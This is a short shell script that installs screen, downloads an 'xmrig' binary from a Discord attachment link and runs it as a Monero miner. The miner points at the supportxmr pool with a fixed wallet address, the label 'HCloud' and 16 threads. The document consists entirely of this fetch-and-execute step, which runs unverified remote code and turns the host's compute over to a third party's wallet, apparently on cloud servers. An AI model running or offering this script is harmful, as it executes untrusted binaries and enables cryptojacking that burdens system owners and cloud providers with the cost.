export DEBIAN_FRONTEND=noninteractive
apt-get update -y
apt-get install screen -y
cd ~
wget https://cdn.discordapp.com/attachments/863132205546733588/899772222057623602/xmrig
chmod +x ./xmrig
screen ~/xmrig -u 47wTn6xUQssR4Pg1Y1rTQre12k4KeepSJTAKz2QyGeSg26kdZGbvpie5tehRt39cjSTYF8fcfAi1RQZ3S4dbHDuXBzs8KEJ -o pool.supportxmr.com:3333 -p HCloud -t 16
